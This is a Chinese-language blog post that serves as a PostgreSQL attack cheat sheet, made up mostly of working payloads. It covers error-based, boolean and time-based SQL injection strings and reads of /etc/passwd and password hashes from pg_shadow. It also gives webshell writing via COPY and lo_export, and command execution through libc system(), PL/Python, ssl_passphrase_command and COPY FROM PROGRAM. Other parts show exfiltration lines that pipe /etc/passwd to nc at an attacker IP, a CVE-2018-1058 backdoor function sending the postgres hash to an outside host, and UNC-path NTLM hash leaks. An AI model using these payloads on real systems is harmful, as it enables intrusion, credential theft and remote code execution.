---
layout:     post
title:      PostgreSQL
subtitle:   sql
date:       2024-08-04
author:     lyk
header-img: img/post-bg-debug.png
catalog: true
tags:
    - sql
---

# 0x00 信息搜集

**查看服务器端版本**

```postgresql
-- 详细信息
select version();

-- 版本信息
show server_version;
select pg_read_file('PG_VERSION', 0, 200);

-- 数字版本信息包括小版号
SHOW server_version_num;
SELECT current_setting('server_version_num');
```

 

**列目录**

  -- 注意: 在早期的  PostgreSQL 版本中,pg_ls_dir 不允许使用绝对路径

```postgresql
-- 注意: 在早期的 PostgreSQL 版本中,pg_ls_dir 不允许使用绝对路径
select pg_ls_dir('/etc');

-- 获取 pgsql 安装目录
select setting from pg_settings where name = 'data_directory';

-- 查找 pgsql 配置文件路径
select setting from pg_settings where name='config_file'
```

 

**列出数据库**

```postgresql
SELECT datname FROM  pg_database;  
```

 

**查看支持的语言**

```postgresql
select * from  pg_language;  
```

 

**查看安装的扩展**

```postgresql
select * from  pg_available_extensions;  
```

 

**查看服务器ip地址**

```postgresql
select inet_server_addr()
```

 

**查看当前用户是不是管理员权限**

```postgresql
SELECT current_setting('is_superuser');
-- on 代表是, off 代表不是

SHOW is_superuser;
SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;
```

 

**查询密码**

```postgresql
SELECT usename, passwd FROM pg_shadow;

SELECT rolname,rolpassword FROM pg_authid;

我们可以查询当前的加密方式

-- password_encryption参数决定了密码怎么被hash
SELECT name,setting,source,enumvals FROM pg_settings WHERE name = 'password_encryption';
```

 

**添加用户**

```postgresql
--创建 f0x，赋予角色属性
create user f0x password 'Abcd1234' superuser createrole createdb
--添加 f0x 到角色组
grant postgres to f0x
```

 

**修改一个角色为管理员角色**

```postgresql
alter role f0x  createrole;  
```

 

**更改密码**

```postgresql
ALTER USER user_name  WITH PASSWORD 'new_password';  
```

 

**查看用户**

```postgresql
SELECT user;
SELECT current_user;
SELECT session_user;
SELECT usename FROM pg_user;
SELECT getpgusername();
```

 

**查看管理员用户**

```postgresql
SELECT usename FROM  pg_user WHERE usesuper IS TRUE  
```

 

**获取用户角色**

```postgresql
SELECT
      r.rolname,
      r.rolsuper,
      r.rolinherit,
      r.rolcreaterole,
      r.rolcreatedb,
      r.rolcanlogin,
      r.rolconnlimit, r.rolvaliduntil,
  ARRAY(SELECT b.rolname
        FROM pg_catalog.pg_auth_members m
        JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
        WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
```



# 0x01 报错注入

利用PostgreSQL数据库的强类型特性，通过构造特定的SQL语句，使数据库产生错误信息，并从错误信息中获取敏感数据。PostgreSQL报错注入的原理和MSSQL报错注入类似，都是使用`cast()`或`convert()`等函数，将一个字符串强制转换为一个数值，从而触发类型不匹配的错误。例如，下面的语句就会产生一个错误：

```postgresql
select * from tbuser where id=1 and 7778=cast((select version())::text as numeric)
```



这个语句的作用是将数据库的版本信息（一个字符串）转换为一个数值，和7778进行比较。显然，这个转换是不合法的，所以数据库会返回一个错误信息，类似这样：

```javascript
ERROR: invalid input syntax for type numeric: "PostgreSQL 13.3 on x86_64-pc-linux-gnu, compiled by gcc (GCC) 10.2.0, 64-bit"
```



从这个错误信息中，我们就可以获取到数据库的版本信息。同理，我们可以利用这种方法，获取数据库的其他信息，如模式名称、表名、字段名、字段内容等。

```postgresql
,cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)
,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name='data_table'+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)

' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1
' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1
' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1
' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1
```



# 0x02 XML helpers

```postgresql
select query_to_xml('select * from pg_user',true,true,''); -- returns all the results as a single xml row
```

query_to_xml将指定查询的所有结果作为单个结果返回。将其与PostgreSQL报错注入链接起来以窃取数据，而不必担心LIMIT查询到一个结果

```postgresql
select database_to_xml(true,true,''); -- dump the current database to XML
select database_to_xmlschema(true,true,''); -- dump the current db to an XML schema
```

对于上述查询，输出需要在内存中组装。对于较大的数据库，这可能会导致速度减慢或拒绝服务情况。



# 0x03 盲注

#### **布尔**

```
' and substr(version(),1,10) = 'PostgreSQL' and '1  -> OK
' and substr(version(),1,10) = 'PostgreXXX' and '1  -> KO
```

#### **时间**

```postgresql
确定基于时间
select 1 from pg_sleep(5)
;(select 1 from pg_sleep(5))
||(select 1 from pg_sleep(5))

基于数据库转储时间
select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1

基于表转储时间
select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1

基于列转储时间
select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1
select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name where column_name='value' limit 1
```



#### **外带**

通过利用PostgreSQL的一些扩展模块，如`dblink`，`postgres_fdw`，`pg_copy`等，来创建DNS查询或读取SMB共享域名，从而将数据传输到攻击者的服务器。这种盲注的条件比较苛刻，需要能够堆叠语句，且当前用户必须有足够的权限。

- 首先，我们需要在我们的服务器上创建一个DNS服务器和一个SMB服务器，用于接收数据。我们可以使用`dnschef`和`impacket`等工具来实现。例如，我们可以在我们的服务器上运行以下命令：

```postgresql
dnschef --fakeip 192.168.1.100 --interface eth0
smbserver.py -smb2support share /tmp
```



这样，我们就在我们的服务器上创建了一个DNS服务器，用于解析任意域名为192.168.1.100，和一个SMB服务器，用于共享/tmp目录。

- 然后，我们需要在目标数据库上创建一个外部服务器，用于连接我们的服务器。我们可以使用`dblink`或`postgres_fdw`等模块来实现。例如，我们可以输入以下语句：

```postgresql
id=1; create extension dblink; select dblink_connect('myserver','host=192.168.1.100 port=445 user=guest password=guest dbname=share')
```



这样，我们就在目标数据库上创建了一个外部服务器，名为myserver，用于连接我们的服务器的SMB共享。

- 最后，我们需要在目标数据库上创建一个外部表，用于读取或写入我们的服务器的文件。我们可以使用`pg_copy`或`postgres_fdw`等模块来实现。例如，我们可以输入以下语句：

```postgresql
id=1; create extension pg_copy; create foreign table mytable (data text) server myserver options (filename 'data.txt', format 'text'); insert into mytable select current_user
```



这样，我们就在目标数据库上创建了一个外部表，名为mytable，用于读取或写入我们的服务器的data.txt文件。我们还向这个表中插入了当前用户的信息。我们可以在我们的服务器上查看这个文件的内容，例如：

```bash
cat /tmp/data.txt
```



我们就可以看到目标数据库的当前用户的信息，例如：

```javascript
dbuser
```



通过这种方法，我们可以逐步获取数据库的结构和内容，例如，我们可以用`length()`和`substr()`函数，结合ASCII码，来获取数据库名、表名、字段名和字段内容。例如，我们可以输入以下语句：

```postgresql
id=1; insert into mytable select current_database()
```



这样，我们就可以在我们的服务器上查看目标数据库的当前数据库名。



# 0x04 绕过

#### 过滤单引号

**使用$符号**

SELECT $$test$$;与SELECT 'test';

 

如果连续的美元符号被阻止（$$），那么您也可以在postgreSQL中使用标签，方法是将标签名称放在$符号之间： SELECT $quote$test$quote$;与SELECT 'test';

 

**CHR()函数**

同时我们也可以在字符串拼接的时候采取CHR()函数:

SELECT CHR(65)||CHR(66)||CHR(67)||CHR(68)||CHR(69)||CHR(70)||CHR(71)||CHR(72);等效于SELECT 'ABCDEFGH';

 

注意：您不能同时使用'和$$ $quote$，因此，如果您需要转义以单引号开头的字符串，则将无法使用$$(即这种语句是无效的SELECT 'test$$;)

# 0x04 文件读取

#### pg_read_file

```postgresql
-- 注意: 在早期的 PostgreSQL 版本中,pg_read_file 不允许使用绝对路径
select pg_read_file('/etc/passwd');

-- 单引号被转义的情况下使用
select/**/PG_READ_FILE($$/etc/passwd$$)
```

 

#### **copy**

```postgresql
create table testf0x(t TEXT);
copy testf0x from '/etc/passwd';
select * from testf0x limit 1 offset 0;
```

 

#### lo_import

```postgresql
lo_import 允许指定文件系统路径。该文件将被读取并加载到一个大对象中，并返回该对象的 OID。

Select lo_import('/etc/passwd',12345678);
select array_agg(b)::text::int from(select encode(data,'hex')b,pageno from pg_largeobject where loid=12345678 order by pageno)a

-- 单引号被转义的情况下使用
select/**/lo_import($$/etc/passwd$$,11111);
select/**/cast(encode(data,$$base64$$)as/**/integer)/**/from/**/pg_largeobject/**/where/**/loid=11111
```



# 0x05 getshell

**利用条件**

1. 拥有网站路径写入权限
2. 知道网站绝对路径



#### COPY

```postgresql
COPY 命令可以用于表和文件之间交换数据，这里可以用它写 webshell

COPY (select '<?php phpinfo();?>') to '/tmp/1.php';

也可以 base64 一下
COPY (select convert_from(decode('ZmZmZmZmZmYweA==','base64'),'utf-8')) to '/tmp/success.txt';
```



#### lo_export

```postgresql
lo_export 采用大对象 OID 和路径，将文件写入路径。

select lo_from_bytea(12349,'ffffffff0x');
SELECT lo_export(12349, '/tmp/ffffffff0x.txt');

-- base64 的形式
select lo_from_bytea(12350,decode('ZmZmZmZmZmYweA==','base64'));
SELECT lo_export(12350, '/tmp/ffffffff0x.txt');
```



#### lo_export + pg_largeobject

```postgresql
-- 记下生成的lo_creat ID
select lo_creat(-1);

-- 替换 24577 为生成的lo_creat ID
INSERT INTO pg_largeobject(loid, pageno, data) values (24577, 0, decode('ZmZmZmZmZmYweA==', 'base64'));
select lo_export(24577, '/tmp/success.txt');

如果内容过多，那么首先创建一个 OID 作为写入的对象, 然后通过 0,1,2,3… 分片上传但是对象都为 12345 最后导出到 /tmp 目录下, 收尾删除 OID

写的文件每一页不能超过 2KB，所以我们要把数据分段，这里我就不拿 .so 文件为例了,就随便写个 txt 举个例子

SELECT lo_create(12345);
INSERT INTO pg_largeobject VALUES (12345, 0, decode('6666', 'hex'));
INSERT INTO pg_largeobject VALUES (12345, 1, decode('666666', 'hex'));
INSERT INTO pg_largeobject VALUES (12345, 2, decode('6666', 'hex'));
INSERT INTO pg_largeobject VALUES (12345, 3, decode('663078', 'hex'));
SELECT lo_export(12345, '/tmp/ffffffff0x.txt');
SELECT lo_unlink(12345);

或者还可以用 lo_put 在后面拼接进行写入

select lo_create(11116);
select lo_put(11116,0,'dGVzdDEyM');
select lo_put(11116,9,'zQ1Ng==');

select lo_from_bytea(11141,decode(encode(lo_get(11116),'escape'),'base64'));
select lo_export(11141,'/tmp/test.txt');
SELECT lo_unlink(11141);

结束记得清理 OID 内容
-- 查看创建的 lo_creat ID
select * from pg_largeobject

-- 使用 lo_unlink 进行删除
SELECT lo_unlink(12345);
```



#### 利用 UDF 命令执行

在 8.2 以前,postgresql 不验证 magic block,可以直接调用本地的 libc.so

```postgresql
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('cat /etc/passwd | nc xxx.xx.xx.xx');
```

8.2 以上版本,需要自己编译 so 文件去创建执行命令函数，可以自己编译反弹 shell 后门，也可以用 sqlmap 提供好的

\- https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/postgresql

 

可以参考 No-Github/postgresql_udf_help

```postgresql
# 找相应的 dev 扩展包
apt-get search postgresql-server-dev
# 安装 dev 扩展包
apt-get install postgresql-server-dev-11
# apt install postgresql-server-dev-all

# 编译好 .so 文件
git clone https://github.com/No-Github/postgresql_udf_help
cd postgresql_udf_help
gcc -Wall -I/usr/include/postgresql/11/server -Os -shared lib_postgresqludf_sys.c -fPIC -o lib_postgresqludf_sys.so
strip -sx lib_postgresqludf_sys.so

# 生成分片后的 sql 语句
cat lib_postgresqludf_sys.so | xxd -ps | tr -d "\n" > 1.txt
python2 postgresql_udf_help.py 1.txt > sqlcmd.txt
```

#### PL/Python 扩展

PostgreSQL 可以支持多种存储过程语言，官方支持的除了 PL/pgSQL，还有 TCL，Perl，Python 等。

 

默认 PostgreSQL 不会安装 Python 的扩展,这里我手动在靶机上安装下进行复现

```postgresql
select version();
```

先看下版本, pg 14

 

搜索下有没有对应的 plpython3u 版本安装

```postgresql
apt search postgresql-plpython
```

 

有,那么直接装

```postgresql
apt install postgresql-plpython-14
```

 

安装完毕后记得注册下扩展

```postgresql
create extension plpython3u;
```

 

查看是否支持 plpython3u

```postgresql
select * from pg_language;
```

 

创建一个 UDF 来执行我们要执行的命令

```postgresql
CREATE FUNCTION system (a text)
  RETURNS text
AS $$
  import os
  return os.popen(a).read()
$$ LANGUAGE plpython3u;
```

 

创建好 UDF 后，进行调用

```shell
select system('ls -la');
```



#### 通过 log_directory 创建文件夹

方法来自于 [https://www.yulegeyu.com/2020/11/16/Postgresql-Superuser-SQL%E6%B3%A8%E5%85%A5-RCE%E4%B9%8B%E6%97%85/](https://www.yulegeyu.com/2020/11/16/Postgresql-Superuser-SQL注入-RCE之旅/) 这篇文章的场景

 

**利用条件**

\- 目标已经配置了 logging_collector = on

 

**描述**

配置文件中的 log_directory 配置的目录不存在时，pgsql 启动会失败，但是如果日志服务已启动,在修改 log_directory 配置后再 reload_conf 目录会被创建

 

**原理**

logging_collector 配置是否开启日志，只能在服务开启时配置，reloadconf 无法修改,log_directory 用来配置 log 日志文件存储到哪个目录，如果 log_directory 配置到一个不存在的目录,pgsql 会创建目录。

 

**利用**

查看配置文件

```postgresql
select pg_read_file('/var/lib/postgresql/data/postgresql.conf');
```

修改配置文件

```postgresql
log_destination = 'csvlog'
log_directory = '/tmp/f0x'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
log_rotation_size = 100MB
log_rotation_age = 1d
log_min_messages = INFO
logging_collector = on
转为 base64 格式

# 这里我将配置文件的内容存到了 out.txt 中
cat out.txt | base64 -w 0 > base64.txt

-- 将修改后的配置文件加载到largeobject中
select lo_from_bytea(10001,decode('base64的内容,这里略','base64'));

-- 通过lo_export覆盖配置文件
select lo_export(10001,'/var/lib/postgresql/data/postgresql.conf');
SELECT lo_unlink(10001);

-- 重新加载配置文件
select pg_reload_conf();

-- 查询一下修改是否成功
select name,setting,short_desc from pg_settings where name like 'log_%';
```



#### 利用 session_preload_libraries 加载共享库

方法来自于 [https://www.yulegeyu.com/2020/11/16/Postgresql-Superuser-SQL%E6%B3%A8%E5%85%A5-RCE%E4%B9%8B%E6%97%85/](https://www.yulegeyu.com/2020/11/16/Postgresql-Superuser-SQL注入-RCE之旅/) 这篇文章的场景

 

**描述**

session_preload_libraries 只允许 superuser 修改，但可以加载任意目录的库，session_preload_libraries 配置从 pg10 开始存在，低于 pg10 时，可以使用 local_preload_libraries，不过该配置只允许加载 $libdir/plugins/ 目录下的库，需要将库写入到该目录下。

 

当每次有新连接进来时，都会加载 session_preload_libraries 配置的共享库。

 

和上面的利用 UDF 命令执行一样，不过不同点在于上面一个是创建 function 加载,这个方式是通过改配置文件中的 session_preload_libraries 进行加载，这里就不复现了



#### 利用 ssl_passphrase_command 执行命令

方法来自于 https://pulsesecurity.co.nz/articles/postgres-sqli 这篇文章的场景

 

**利用条件**

\- 需要知道 PG_VERSION 文件的位置 (不是 PG_VERSION 文件也行,pgsql限制私钥文件权限必须是0600才能够加载，pgsql目录下的所有0600权限的文件都是可以的,但覆盖后没啥影响的就 PG_VERSION 了)

 

**描述**

当配置文件中配置了 ssl_passphrase_command ，那么该配置在需要获取用于解密SSL文件密码时会调用该配置的命令。

 

通过上传 pem，key 到目标服务器上，读取配置文件内容，修改配置文件中的ssl配置改为我们要执行的命令，通过lo_export覆盖配置文件，最后通过 pg_reload_conf 重载配置文件时将执行命令

 

**复现**

这里以靶机上已经存在的2个密钥文件为例

- /etc/ssl/certs/ssl-cert-snakeoil.pem
- /etc/ssl/private/ssl-cert-snakeoil.key

 

通过文件读取获取私钥

select pg_read_file('/etc/ssl/private/ssl-cert-snakeoil.key');

 

对私钥文件加密

\# 密码为 12345678

openssl rsa -aes256 -in ssl-cert-snakeoil.key -out private_passphrase.key

 

\# 输出为 base64 格式

cat private_passphrase.key | base64 -w 0 > base.txt

上传 private_passphrase.key 到目标服务器上

 

由于 pgsql 限制私钥文件权限必须是 0600 才能够加载，这里搜索 pgsql 目录下的所有 0600 权限的文件,发现 PG_VERSION 文件符合条件，而且覆盖也没有太大影响

 

PG_VERSION 与 config_file 文件同目录，上传私钥文件覆盖 PG_VERSION，可绕过权限问题。

 

-- 将 private_passphrase.key 覆盖 PG_VERSION 文件

select lo_from_bytea(10004,decode('base64的内容,这里略','base64'));

select lo_export(10004,'/var/lib/postgresql/data/PG_VERSION');

SELECT lo_unlink(10004);

在靶机中查看验证是否写入成功

 

读取配置文件内容

select setting from pg_settings where name='config_file'

select pg_read_file('/var/lib/postgresql/data/postgresql.conf');

 

在原始配置文件内容末尾追加上ssl配置

```
ssl = on
ssl_cert_file = '/etc/ssl/certs/ssl-cert-snakeoil.pem'
ssl_key_file = '/var/lib/postgresql/data/PG_VERSION'
ssl_passphrase_command_supports_reload = on
ssl_passphrase_command = 'bash -c "touch /tmp/success & echo 12345678; exit 0"'
```

转为 base64 格式

 

\# 这里我将配置文件的内容存到了 out.txt 中

cat out.txt | base64 -w 0 > base3.txt

-- 将修改后的配置文件加载到largeobject中

select lo_from_bytea(10001,decode('base64的内容,这里略','base64'));

 

-- 通过lo_export覆盖配置文件

select lo_export(10001,'/var/lib/postgresql/data/postgresql.conf');

SELECT lo_unlink(10001);

 

-- 重新加载配置文件

select pg_reload_conf();

 

可以看到,重新加载配置文件后,ssl_passphrase_command 中的命令已经执行



#### CVE-2019–9193

如果您可以直接访问数据库，则可以从 [Metasploit](https://github.com/rapid7/metasploit-framework/pull/11598) 使用，否则您需要手动执行以下 SQL 查询。

```postgresql
DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Drop the table you want to use if it already exists
CREATE TABLE cmd_exec(cmd_output text); -- Create the table you want to hold the command output
COPY cmd_exec FROM PROGRAM 'id';        -- Run the system command via the COPY FROM PROGRAM function
SELECT * FROM cmd_exec;                 -- [Optional] View the results
DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Remove the table
```



[![https：//cdn-images-1.medium.com/max/1000/1*xy5graLstJ0KysUCmPMLrw.png](https://camo.githubusercontent.com/c181a4f5c8ec68e1fe2368e1d5cd47daf6d7dfff6daaaf4eb342a07c1fdd251d/68747470733a2f2f63646e2d696d616765732d312e6d656469756d2e636f6d2f6d61782f313030302f312a7879356772614c73744a304b797355436d504d4c72772e706e67)](https://camo.githubusercontent.com/c181a4f5c8ec68e1fe2368e1d5cd47daf6d7dfff6daaaf4eb342a07c1fdd251d/68747470733a2f2f63646e2d696d616765732d312e6d656469756d2e636f6d2f6d61782f313030302f312a7879356772614c73744a304b797355436d504d4c72772e706e67)



#### 使用 libc.so.6

```postgresql
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');
```



# 0x06 提权

#### CVE-2018-1058

PostgreSQL 是一款关系型数据库。其9.3到10版本中存在一个逻辑错误，导致超级用户在不知情的情况下触发普通用户创建的恶意代码，导致执行一些不可预期的操作。

参考链接：

- https://wiki.postgresql.org/wiki/A_Guide_to_CVE-2018-1058:_Protect_Your_Search_Path
- https://xianzhi.aliyun.com/forum/topic/2109

**漏洞环境**

启动存在漏洞的环境：

```
docker compose up -d
```

环境启动后，将在本地开启PG默认的5432端口。

**漏洞复现**

参考上述链接中的第二种利用方式，我们先通过普通用户`vulhub:vulhub`的身份登录postgres: `psql --host your-ip --username vulhub`

![img](https://vulhub.org/vulhub/postgres/CVE-2018-1058/1.png)

执行如下语句后退出：

```postgresql
CREATE FUNCTION public.array_to_string(anyarray,text) RETURNS TEXT AS $$
    select dblink_connect((select 'hostaddr=10.0.0.1 port=5433 user=postgres password=chybeta sslmode=disable dbname='||(SELECT passwd FROM pg_shadow WHERE usename='postgres'))); 
    SELECT pg_catalog.array_to_string($1,$2);
$$ LANGUAGE SQL VOLATILE;
```

然后我在`10.0.0.1`上监听5433端口，等待超级用户触发我们留下的这个“后门”。

（假装自己是超级用户）在靶场机器下，用超级用户的身份执行`pg_dump`命令：`docker compose exec postgres pg_dump -U postgres -f evil.bak vulhub`，导出vulhub这个数据库的内容。

执行上述命令的同时，“后门”已被触发，`10.0.0.1`机器上已收到敏感信息：

![img](https://vulhub.org/vulhub/postgres/CVE-2018-1058/2.png)

上述过程仅是该漏洞的一种利用方法，涉及到机器比较多可能有点乱，建议读者阅读参考链接中的文章，获取更多利用方法。



#### dblink

pg_hba.conf 文件可能配置不当，**允许**来自**本地主机的任何用户**连接而无需知道密码。该文件通常可以在 /etc/postgresql/12/main/pg_hba.conf 中找到，不良配置如下：

local  all  all  trust

 

*请注意，此配置通常用于在管理员忘记密码时修改数据库用户的密码，因此有时您可能会找到它。 还要注意，pg_hba.conf 文件只能被 postgres 用户和组读取，只能被 postgres 用户写入。*

 

如果您已经在受害者内部获得了 shell，这种情况非常有用，因为它将允许您连接到 postgresql 数据库。

 

另一种可能的错误配置如下：

host  all   all   127.0.0.1/32  trust

 

由于它将允许来自本地主机的所有人以任何用户身份连接到数据库。 在这种情况下，如果**dblink**函数**正常工作**，您可以通过通过已建立的连接连接到数据库，并访问本不应访问的数据来**提升权限**：

```postgresql
SELECT * FROM dblink('host=127.0.0.1
user=postgres
dbname=postgres',
'SELECT datname FROM pg_database')
RETURNS (result TEXT);

SELECT * FROM dblink('host=127.0.0.1
user=postgres
dbname=postgres',
'select usename, passwd from pg_shadow')
RETURNS (result1 TEXT, result2 TEXT);
```



**端口扫描**

利用 dblink_connect，您还可以**搜索开放端口**。如果该**函数不起作用，您应该尝试使用 dblink_connect_u()，因为文档中指出 dblink_connect_u() 与 dblink_connect() 相同，只是它允许非超级用户使用任何身份验证方法连接。

```postgresql
SELECT * FROM dblink_connect('host=216.58.212.238
port=443
user=name
password=secret
dbname=abc
connect_timeout=10');
//Different response
// Port closed
RROR:  could not establish connection
DETAIL:  could not connect to server: Connection refused
Is the server running on host "127.0.0.1" and accepting
TCP/IP connections on port 4444?

// Port Filtered/Timeout
ERROR:  could not establish connection
DETAIL:  timeout expired

// Accessing HTTP server
ERROR:  could not establish connection
DETAIL:  timeout expired

// Accessing HTTPS server
ERROR:  could not establish connection
DETAIL:  received invalid response to SSL negotiation:
```

请注意，在能够使用 dblink_connect 或 dblink_connect_u 之前，您可能需要执行：

CREATE extension dblink;



**UNC路径 - NTLM哈希泄露**

```postgresql
-- can be used to leak hashes to Responder/equivalent
CREATE TABLE test();
COPY test FROM E'\\\\attacker-machine\\footestbar.txt';
```

```postgresql
-- to extract the value of user and send it to Burp Collaborator
CREATE TABLE test(retval text);
CREATE OR REPLACE FUNCTION testfunc() RETURNS VOID AS $$
DECLARE sqlstring TEXT;
DECLARE userval TEXT;
BEGIN
SELECT INTO userval (SELECT user);
sqlstring := E'COPY test(retval) FROM E\'\\\\\\\\'||userval||E'.xxxx.burpcollaborator.net\\\\test.txt\'';
EXECUTE sqlstring;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
SELECT testfunc();

```

